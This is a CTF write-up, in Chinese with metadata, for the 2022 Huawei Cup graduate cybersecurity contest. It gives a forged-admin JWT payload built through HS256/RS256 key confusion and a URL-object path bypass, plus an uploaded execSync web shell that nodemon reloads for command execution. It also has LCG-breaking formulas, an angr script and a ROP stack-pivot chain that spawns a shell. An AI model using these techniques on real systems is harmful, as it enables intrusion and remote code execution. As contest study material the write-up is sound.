---
title: 华为杯第一届中国研究生网络安全创新大赛初赛WriteUp
contest: 华为杯
year: 2022
difficulty: mixed
vuln_type: web_unknown
tags: [JWT-HS256-forge, URL-object-bypass, nodemon-restart, LCG-inverse, angr-symbolic-execution, stack-pivot]
attack_chain: Web：用 public.pem 作 HS256 secret 伪造 admin JWT + URL 对象 href/origin/protocol/hostname/pathname 构造 file:// 协议 /app/ 路径避开关键字 + url 编码绕 %72%6f%75%74%65%73 关键字 + /api/upload 写新 index.js 含 execSync + nodemon 自动重启触发/Crypto：四层 LCG 挑战 solve1~4 分别 1/2/3/6 元逆元解 a/N/seed/Re：angr 符号执行 infantvm 找 good=Good job/avoid=Try again 路径/Pwn：栈迁移到 bss 0x6010A0 + leave_ret 跳板 + 泄 puts libc + one_gadget
key_payload: HS256 伪造 JWT: payload={isAdmin:true, username:"admin", home:{href:"ank1e", origin:"ank1e", protocol:"file:", hostname:"", pathname:"/app/%72%6f%75%74%65%73/index.%6a%73"}}
one_liner: 华为杯 2022 研究生国赛初赛 EDI 安全战队 WP，Web HS256 伪造 + URL 对象 bypass / Crypto 四层 LCG / Re angr / Pwn 栈迁移四方向。
lesson: JWT 用 public.pem 作 HS256 secret 是经典算法混淆漏洞；URL 对象 pathname 可绕关键字正则；LCG 等差数列求 N 用 GCD 三个二阶差分；angr entry_state + simulation_manager 找 good/avoid 路径；栈迁移到 bss + leave_ret 是经典 pwn 入门。
quality: high
---

# 华为杯 2022 第一届中国研究生网络安全创新大赛初赛 WriteUp

## 概览
EDI 安全战队 WP，Web/Crypto/Re/Pwn 四大方向入门综合。

## Web
- 漏洞点：`expressjwt({ secret: publicKey, algorithms: ["HS256","RS256"] })` 同时支持 HS256 和 RS256，但 secret 用的是 public.pem
- 攻击：用 public.pem 当 HS256 密钥伪造 admin JWT
- bypass 关键字检查：用 URL 对象代替字符串，pathname 走 `%72%6f%75%74%65%73` URL 编码
- payload：
  ```js
  payload = { isAdmin: true, username: "admin", home: { href: "ank1e", origin: "ank1e", protocol: "file:", hostname: "", pathname: "/app/%72%6f%75%74%65%73/index.%6a%73" }}
  ```
- /api/upload 写新 index.js 含 `execSync(req.query.cmd)`，nodemon 自动重启触发 RCE
- 攻击脚本：requests + /api/upload 提交 file + GET /?cmd=/readflag

## Crypto
- 四层 LCG 挑战交互脚本：
  - solve1: `seed = inverse(a, N) * (num1 - b) % N`（已知 a/b/N/num1）
  - solve2: `b = (num2 - num1*a) % N; seed = inverse(a, N) * (num1 - b) % N`（已知 a/N/num1/num2）
  - solve3: `a = inverse(num2-num1, N) * (num3-num2) % N; b = num2 - a*num1; seed = inverse(a, N) * (num1 - b) % N`
  - solve4: 等差数列求 N，二阶差分 `t[i] = num_list[i+1] - num_list[i]`，三阶差分 GCD 得到 N
- pwntools remote 自动判断 challenge1~4 调用对应 solve

## Re (infantvm)
- angr 符号执行：
  ```python
  import angr
  p = angr.Project('./infantvm')
  a = p.factory.entry_state()
  sm = p.factory.simulation_manager(a)
  def good(a): return b"Good job" in a.posix.dumps(1)
  def bad(a): return b"Try again" in a.posix.dumps(1)
  sm.explore(find=good, avoid=bad)
  ```
- 推荐 docker pull angr/angr + docker run -v

## Pwn
- 栈迁移到 bss 0x6010A0 + leave_ret 跳板
- 第一次 send payload = p64(ret)*0x20 + pop_rdi(puts_got) + puts_plt + main
- 第二次 send payload = a*0x70 + p64(bss) + leave_ret
- 泄 libc 后 one_gadget = libc_base + 0xf1247
- 第三次 send ret + pop_rdi(binsh) + system 收壳

## 经验提炼
- JWT 用公钥当 HS256 secret 是经典算法混淆漏洞，比单纯 secret 泄漏更隐蔽
- URL 对象 pathname 字段可绕关键字正则，配合 URL 编码双重 bypass
- nodemon 自动重启把"上传文件→重启生效"链路缩短为单次 RCE
- LCG 四层逆元分别用 1/2/3 元 + 等差数列求 N（用三阶差分 GCD）
- angr entry_state 是最简单符号执行入口，simulation_manager.explore(find, avoid) 是标准 API
- 栈迁移 bss + leave_ret 是入门 pwn 经典套路，比单纯 ROP 更稳定
